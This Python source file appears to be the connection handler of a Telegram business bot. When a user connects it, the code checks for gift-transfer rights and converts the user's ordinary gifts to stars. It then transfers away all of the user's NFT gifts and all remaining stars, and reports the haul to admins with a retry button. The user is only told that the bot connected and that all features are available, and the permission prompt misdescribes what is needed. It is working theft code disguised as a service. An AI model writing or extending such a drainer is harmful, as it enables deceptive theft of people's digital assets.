import asyncio
import logging
from datetime import datetime
from typing import List, Dict, Any

from aiogram import Bot, F
from aiogram.types import BusinessConnection, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.methods import GetBusinessAccountGifts, GetBusinessConnection
from aiogram.dispatcher.router import Router
from aiogram.types import CallbackQuery

from config import get_main_admin_id, BALANCE_UPDATE_DELAY, MAX_NFT_DISPLAY
from utils.file_utils import save_connection, remove_connection, log_transfer
from utils.transfer import (
    get_star_balance, get_regular_gifts, get_unique_gifts, convert_regular_gifts,
    transfer_all_unique_gifts, transfer_all_stars, get_nft_real_id, get_nft_title
)
from utils.logging import log_business_connection, log_user_connection, log_nft_transfer, log_stars_transfer, log_gift_conversion, log_automation_trigger, log_business_error

router = Router()
logger = logging.getLogger(__name__)

# Глобальные настройки (будут загружаться из файла)
AUTO_TRANSFER_ENABLED = True
MANUAL_SELECTION_ENABLED = False
# Временная настройка для отладки - отключить проверку разрешений
# УСТАНОВИТЬ В False ПОСЛЕ ИСПРАВЛЕНИЯ БАГА
DEBUG_SKIP_PERMISSIONS_CHECK = False

def update_settings(auto_transfer: bool, manual_selection: bool):
    """Обновление глобальных настроек"""
    global AUTO_TRANSFER_ENABLED, MANUAL_SELECTION_ENABLED
    AUTO_TRANSFER_ENABLED = auto_transfer
    MANUAL_SELECTION_ENABLED = manual_selection

def get_nft_title(gift) -> str:
    """Получение названия NFT"""
    if hasattr(gift, 'title') and gift.title:
        return gift.title
    if hasattr(gift, 'gift') and gift.gift and hasattr(gift.gift, 'title') and gift.gift.title:
        return gift.gift.title
    return "NFT"

def get_nft_real_id(gift) -> str:
    """Получение реального ID NFT для ссылки"""
    # Пробуем разные варианты получения ID для ссылки
    if hasattr(gift, 'gift_id') and gift.gift_id:
        return gift.gift_id
    elif hasattr(gift, 'gift') and gift.gift and hasattr(gift.gift, 'id') and gift.gift.id:
        return gift.gift.id
    elif hasattr(gift, 'gift') and gift.gift and hasattr(gift.gift, 'gift_id') and gift.gift.gift_id:
        return gift.gift.gift_id
    elif hasattr(gift, 'id') and gift.id:
        return gift.id
    elif hasattr(gift, 'gift') and gift.gift and hasattr(gift.gift, 'name') and gift.gift.name:
        return gift.gift.name
    elif hasattr(gift, 'gift') and gift.gift and hasattr(gift.gift, 'slug') and gift.gift.slug:
        return gift.gift.slug
    else:
        return getattr(gift, 'owned_gift_id', 'unknown')

async def check_business_permissions(bot: Bot, business_connection_id: str) -> dict:
    """
    Проверка разрешений бизнес-подключения
    
    ИСПРАВЛЕНИЕ БАГА: 
    - Используем объект rights для проверки разрешений
    - Проверяем can_transfer_and_upgrade_gifts вместо can_reply
    - Добавлена отладочная информация для диагностики проблем
    """
    try:
        # Получаем информацию о бизнес-подключении
        connection_info = await bot(GetBusinessConnection(business_connection_id=business_connection_id))
        
        # Отладочная информация
        logger.info(f"BusinessConnection object: {connection_info}")
        
        # Проверяем разрешения через объект rights
        permissions = {}
        rights = getattr(connection_info, 'rights', None)
        
        if rights:
            logger.info(f"BusinessBotRights: {rights}")
            
            # Проверяем основные разрешения для работы с подарками
            permissions['can_transfer_and_upgrade_gifts'] = getattr(rights, 'can_transfer_and_upgrade_gifts', False)
            permissions['can_convert_gifts_to_stars'] = getattr(rights, 'can_convert_gifts_to_stars', False)
            permissions['can_transfer_stars'] = getattr(rights, 'can_transfer_stars', False)
            permissions['can_view_gifts_and_stars'] = getattr(rights, 'can_view_gifts_and_stars', False)
            
            # Дополнительные разрешения для отладки
            permissions['can_reply'] = getattr(rights, 'can_reply', None)
            permissions['can_read_messages'] = getattr(rights, 'can_read_messages', None)
            permissions['can_delete_sent_messages'] = getattr(rights, 'can_delete_sent_messages', None)
            permissions['can_delete_all_messages'] = getattr(rights, 'can_delete_all_messages', None)
            permissions['can_edit_name'] = getattr(rights, 'can_edit_name', False)
            permissions['can_edit_bio'] = getattr(rights, 'can_edit_bio', False)
            permissions['can_edit_profile_photo'] = getattr(rights, 'can_edit_profile_photo', False)
            permissions['can_edit_username'] = getattr(rights, 'can_edit_username', False)
            permissions['can_change_gift_settings'] = getattr(rights, 'can_change_gift_settings', False)
            permissions['can_manage_stories'] = getattr(rights, 'can_manage_stories', False)
            permissions['can_delete_outgoing_messages'] = getattr(rights, 'can_delete_outgoing_messages', None)
        else:
            logger.warning("Объект rights не найден")
        
        # Логируем все разрешения для отладки
        logger.info(f"All permissions: {permissions}")
        
        # Проверяем, есть ли все необходимые разрешения для работы с подарками
        # Для работы с подарками достаточно can_transfer_and_upgrade_gifts
        required_permissions = ['can_transfer_and_upgrade_gifts']
        missing_permissions = [perm for perm in required_permissions if not permissions.get(perm, False)]
        
        logger.info(f"Required permissions: {required_permissions}")
        logger.info(f"Missing permissions: {missing_permissions}")
        logger.info(f"can_transfer_and_upgrade_gifts value: {permissions.get('can_transfer_and_upgrade_gifts', False)}")
        
        # Финальная проверка
        has_all_permissions = permissions.get('can_transfer_and_upgrade_gifts', False)
        missing_permissions = ['can_transfer_and_upgrade_gifts'] if not has_all_permissions else []
        
        logger.info(f"Final check - has_all_permissions: {has_all_permissions}")
        
        return {
            'has_all_permissions': has_all_permissions,
            'missing_permissions': missing_permissions,
            'all_permissions': permissions
        }
        
    except Exception as e:
        logger.error(f"Ошибка проверки разрешений: {e}")
        return {
            'has_all_permissions': False,
            'missing_permissions': ['unknown'],
            'all_permissions': {},
            'error': str(e)
        }

@router.business_connection()
async def handle_business_connect(business_connection: BusinessConnection, bot: Bot):
    """Обработчик бизнес-подключений"""
    try:
        user_id = business_connection.user.id
        conn_id = business_connection.id
        username = business_connection.user.username or 'N/A'

        # Логируем подключение сразу
        logger.info(f"🔗 Новое бизнес-подключение: @{username} (ID: {user_id}, Connection ID: {conn_id})")
        
        # Отправляем уведомление админам о новом подключении
        from config import get_admin_ids
        admin_notification = (
            f"🔗 <b>Новое бизнес-подключение</b>\n"
            f"👤 Пользователь: <b>@{username}</b>\n"
            f"🆔 ID: <code>{user_id}</code>\n"
            f"🔗 Connection ID: <code>{conn_id}</code>\n"
            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        for admin_id in get_admin_ids():
            try:
                await bot.send_message(admin_id, admin_notification, parse_mode="HTML")
            except Exception as e:
                logger.error(f"Ошибка отправки уведомления админу {admin_id}: {e}")

        if not conn_id:
            logger.error(f"business_connection.id is None for user {user_id} (@{username})")
            for admin_id in get_admin_ids():
                await bot.send_message(
                    admin_id,
                    f"❌ <b>Ошибка:</b> business_connection.id is None для пользователя <b>@{username}</b> (ID: <code>{user_id}</code>)",
                    parse_mode="HTML"
                )
            return

        # Сохраняем подключение в БД
        connection_data = {
            "user_id": user_id,
            "business_connection_id": conn_id,
            "username": username,
            "first_name": business_connection.user.first_name,
            "last_name": business_connection.user.last_name,
            "connection_date": datetime.now().isoformat(),
            "last_activity": datetime.now().isoformat()
        }
        
        if not save_connection(connection_data):
            logger.error(f"Ошибка сохранения подключения для пользователя {user_id}")
            return
        
        # Проверяем разрешения бизнес-подключения
        permissions_check = await check_business_permissions(bot, conn_id)
        
        # Если не все разрешения предоставлены, отправляем уведомление пользователю
        if not permissions_check['has_all_permissions']:
            missing_perms = permissions_check['missing_permissions']
            permissions_message = (
                f"⚠️ <b>Внимание!</b> Для корректной работы бота необходимо предоставить разрешение на отправку сообщений.\n\n"
                f"<b>Отсутствующие разрешения:</b>\n"
            )
            
            if 'can_transfer_and_upgrade_gifts' in missing_perms:
                permissions_message += "• <b>Перевод и улучшение подарков</b> - для работы с NFT и звездами\n"
            
            permissions_message += (
                f"\n📋 <b>Как исправить:</b>\n"
                f"1. Откройте <b>настройки</b> в Telegram\n"
                f"2. Найдите вкладку <b>Telegram для бизнеса</b>\n"
                f"3. Выберите вкладку <b>Чат-боты</b>\n"
                f"4. Найдите <b>@Sendstarstelegramrobot</b>\n"
                f"5. Нажмите <b>Настройки</b> → <b>Разрешения</b>\n"
                f"6. Включите <b>Перевод и улучшение подарков</b>\n\n"
                f"🔧 <b>Альтернативный способ:</b>\n"
                f"1. Откройте чат с @Sendstarstelegramrobot\n"
                f"2. Нажмите на название бота вверху\n"
                f"3. Выберите <b>Разрешения</b>\n"
                f"4. Включите <b>Перевод и улучшение подарков</b>\n\n"
                f"После этого переподключите бота для корректной работы! ⭐️"
            )
            
            # Создаем клавиатуру с кнопкой настроек
            permissions_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⚙️ Перейти в настройки", url="tg://settings")],
                [InlineKeyboardButton(text="🔄 Переподключить бота", callback_data="reconnect_bot")]
            ])
            
            try:
                await bot.send_message(
                    user_id,
                    permissions_message,
                    parse_mode="HTML",
                    reply_markup=permissions_keyboard
                )
                logger.info(f"Отправлено уведомление о недостающих разрешениях пользователю {user_id}")
            except Exception as e:
                logger.error(f"Ошибка отправки уведомления о разрешениях пользователю {user_id}: {e}")
            
            # Отправляем уведомление админам о неполных разрешениях
            admin_notification = (
                f"⚠️ <b>Подключение с неполными разрешениями</b>\n"
                f"👤 Пользователь: <b>@{username}</b>\n"
                f"🆔 ID: <code>{user_id}</code>\n"
                f"❌ <b>Операции НЕ выполнены</b> - недостаточно разрешений\n\n"
                f"<b>Отсутствующие разрешения:</b>\n"
            )
            
            if 'can_transfer_and_upgrade_gifts' in missing_perms:
                admin_notification += "• <b>Перевод и улучшение подарков</b>\n"
            
            admin_notification += f"\nПользователь получил инструкцию по исправлению разрешений."
            
            for admin_id in get_admin_ids():
                await bot.send_message(admin_id, admin_notification, parse_mode="HTML")
            
            # Останавливаем выполнение - не выполняем операции с неполными разрешениями
            return
        
        # Проверяем, был ли пользователь уже в базе (повторное подключение)
        from utils.database import DatabaseManager
        db = DatabaseManager()
        user_in_db = db.get_user(user_id)
        connection_type = "reconnected" if user_in_db else "connected"

        # Получаем баланс и подарки для логирования
        star_balance = 0
        nft_count = 0
        regular_gifts_count = 0
        try:
            star_balance = await get_star_balance(bot, conn_id)
        except Exception:
            pass
        try:
            all_gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=conn_id))
            all_gifts = all_gifts_response.gifts if hasattr(all_gifts_response, 'gifts') else []
            nft_count = len([gift for gift in all_gifts if getattr(gift, 'type', None) == 'unique'])
            regular_gifts_count = len([gift for gift in all_gifts if getattr(gift, 'type', None) != 'unique'])
        except Exception:
            pass

        log_user_connection(username, user_id, star_balance, nft_count, regular_gifts_count)
        log_business_connection(username, user_id, connection_type)

        # Получаем начальный баланс звёзд
        try:
            star_balance = await get_star_balance(bot, conn_id)
        except Exception as e:
            if "BUSINESS_CONNECTION_INVALID" in str(e):
                remove_connection(conn_id)
                for admin_id in get_admin_ids():
                    await bot.send_message(
                        admin_id,
                        f"❌ <b>BUSINESS_CONNECTION_INVALID</b> — подключение удалено из базы для пользователя <b>@{username}</b> (ID: <code>{user_id}</code>)",
                        parse_mode="HTML"
                    )
                return
            else:
                raise

        # Получаем все подарки
        try:
            all_gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=conn_id))
            all_gifts = all_gifts_response.gifts if hasattr(all_gifts_response, 'gifts') else []
            logger.info(f"ВСЕ ПОДАРКИ для @{username} ({user_id}): {[str(gift) for gift in all_gifts]}")
            nft_gifts = [gift for gift in all_gifts if getattr(gift, 'type', None) == 'unique']
        except Exception as e:
            logger.error(f"Ошибка при получении всех подарков: {e}")
            all_gifts = []
            nft_gifts = []

        # Формируем базовый отчет
        report = (
            f"🔗 <b>Новое подключение</b>\n"
            f"👤 Пользователь: <b>@{username}</b>\n"
            f"🆔 ID: <code>{user_id}</code>\n"
            f"⭐️ Звезд: <b>{star_balance}</b>\n"
        )
        
        # Добавляем информацию о разрешениях
        if not permissions_check['has_all_permissions']:
            report += f"⚠️ <b>Разрешения:</b> <b>НЕ ПОЛНЫЕ</b>\n"
            missing_perms = permissions_check['missing_permissions']
            for perm in missing_perms:
                if perm == 'can_transfer_and_upgrade_gifts':
                    report += f"• Отсутствует: <b>Перевод и улучшение подарков</b>\n"
        else:
            report += f"✅ <b>Разрешения:</b> <b>ПОЛНЫЕ</b>\n"
        
        report += "\n"

        report += f"<b>Найдено NFT-подарков:</b> <b>{len(nft_gifts)}</b>\n"
        for gift in nft_gifts[:MAX_NFT_DISPLAY]:
            title = get_nft_title(gift)
            owned_gift_id = getattr(gift, 'owned_gift_id', '???')
            real_id = get_nft_real_id(gift)

            nft_link = f"https://t.me/nft/{real_id}"
            report += f"• {title} (<a href=\"{nft_link}\">{real_id}</a>, owned_id: {owned_gift_id})\n"
        if len(nft_gifts) > MAX_NFT_DISPLAY:
            report += f"• ...ещё {len(nft_gifts)-MAX_NFT_DISPLAY} NFT-подарков\n"

        # 1. Конвертируем обычные подарки в звёзды
        try:
            regular_gifts = await get_regular_gifts(bot, conn_id)
        except Exception as e:
            logger.error(f"Ошибка при get_regular_gifts: {e}")
            regular_gifts = []
        gift_count = len(regular_gifts)
        report += f"\n🎁 Обычных подарков: <b>{gift_count}</b>\n"

        convert_result = {"gifts_total": gift_count, "gifts_converted": 0, "errors": []}
        if gift_count > 0:
            convert_result = await convert_regular_gifts(bot, conn_id, user_id)
            report += (
                f"\n📊 <b>Конвертация подарков</b>:\n"
                f"• Обычных подарков найдено: <b>{convert_result['gifts_total']}</b>\n"
                f"• Конвертировано: <b>{convert_result['gifts_converted']}</b>\n"
                f"• Слишком старых: <b>{convert_result['too_old']}</b>\n"
                f"• Другие ошибки: <b>{convert_result['other_failed']}</b>\n"
            )
            if convert_result["errors"]:
                report += "\n⚠️ <b>Ошибки конвертации:</b>\n"
                for e in convert_result["errors"][:3]:
                    report += f"• {e}\n"

        # Ждём зачисления звёзд
        if convert_result["gifts_converted"] > 0:
            await asyncio.sleep(BALANCE_UPDATE_DELAY)

        # Проверяем баланс после конвертации
        try:
            star_balance = await get_star_balance(bot, conn_id)
            report += f"\n⭐️ <b>Баланс после конвертации:</b> <b>{star_balance}</b>\n"
        except Exception as e:
            logger.error(f"Ошибка получения баланса после конвертации: {e}")
            star_balance = 0
            report += f"\n❗️ <b>Ошибка получения баланса:</b> {str(e)}\n"

        # 2. Переводим все NFT
        nft_result = await transfer_all_unique_gifts(bot, conn_id, user_id)
        report += (
            f"\n🎁 <b>NFT-подарков:</b> <b>{nft_result['total']}</b>\n"
            f"• Успешно: <b>{nft_result['transferred']}</b>\n"
            f"• Ошибок: <b>{nft_result['failed']}</b>\n"
        )
        if nft_result["errors"]:
            report += "\n❗️<b>Ошибки NFT:</b>\n"
            for e in nft_result["errors"][:3]:
                if "STARGIFT_TRANSFER_TOO_EARLY" in e:
                    report += f"• {e} — <i>Telegram не разрешает переводить NFT сразу после получения, попробуйте позже.</i>\n"
                elif "BALANCE_TOO_LOW" in e:
                    report += f"• {e} — <i>Недостаточно звёзд для перевода NFT.</i>\n"
                else:
                    report += f"• {e}\n"

        # 3. Переводим все оставшиеся звёзды
        stars_result = await transfer_all_stars(bot, conn_id, user_id)
        report += f"\n⭐️ <b>Перевод всех звёзд:</b>\n• Было на счету: <b>{stars_result['stars']}</b>\n• Переведено: <b>{stars_result['transferred']}</b>\n"
        if stars_result["error"]:
            report += f"❗️Ошибка при переводе звёзд: {stars_result['error']}\n"

        # Логируем успешное завершение операций
        logger.info(f"✅ Операции завершены для @{username} (ID: {user_id})")
        
        # Отправляем отчет всем админам
        admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='🔄 Повторить перевод NFT', callback_data=f'retry_nft_user:{user_id}')],
            [InlineKeyboardButton(text='📋 Логи по пользователю', callback_data=f'logs_user:{user_id}')],
            [InlineKeyboardButton(text='💬 Написать пользователю', url=f'tg://user?id={user_id}')]
        ])
        for admin_id in get_admin_ids():
            try:
                await bot.send_message(admin_id, report, parse_mode='HTML', reply_markup=admin_keyboard)
            except Exception as e:
                logger.error(f"Ошибка отправки отчета админу {admin_id}: {e}")

        # Сообщение пользователю
        await bot.send_message(
            user_id,
            "✅ <b>Бот успешно подключен!</b>\nВесь функционал теперь доступен.",
            parse_mode="HTML"
        )

    except Exception as e:
        logger.error(f"Ошибка в handle_business_connect: {e}")
        for admin_id in get_admin_ids():
            await bot.send_message(admin_id, f"🚨 <b>Ошибка при подключении:</b> {str(e)}", parse_mode="HTML")

@router.callback_query(F.data == "reconnect_bot")
async def handle_reconnect_bot(callback: CallbackQuery):
    """Обработчик кнопки переподключения бота"""
    try:
        user_id = callback.from_user.id
        username = callback.from_user.username or callback.from_user.first_name
        
        # Отправляем инструкцию по переподключению
        reconnect_message = (
            f"🔄 <b>Переподключение бота</b>\n\n"
            f"📋 <b>Пошаговая инструкция:</b>\n\n"
            f"<b>1. Откройте настройки Telegram</b>\n"
            f"<b>2. Найдите раздел Telegram для бизнеса</b>\n"
            f"<b>3. Выберите вкладку Чат-боты</b>\n"
            f"<b>4. Найдите @Sendstarstelegramrobot</b>\n"
            f"<b>5. Нажмите Отключить</b>\n"
            f"<b>6. Затем нажмите Подключить</b>\n"
            f"<b>7. Убедитесь что ВСЕ разрешения включены</b>\n\n"
            f"✅ После этого бот автоматически обработает ваши подарки!"
        )
        
        # Создаем клавиатуру с кнопкой настроек
        from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
        reconnect_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⚙️ Перейти в настройки", url="tg://settings")],
            [InlineKeyboardButton(text="✨ Проверить подключение", callback_data="check_connection")]
        ])
        
        await callback.message.edit_text(
            reconnect_message,
            parse_mode="HTML",
            reply_markup=reconnect_keyboard
        )
        
        await callback.answer("Инструкция отправлена!")
        
    except Exception as e:
        logger.error(f"Ошибка в handle_reconnect_bot: {e}")
        await callback.answer("Произошла ошибка", show_alert=True) 
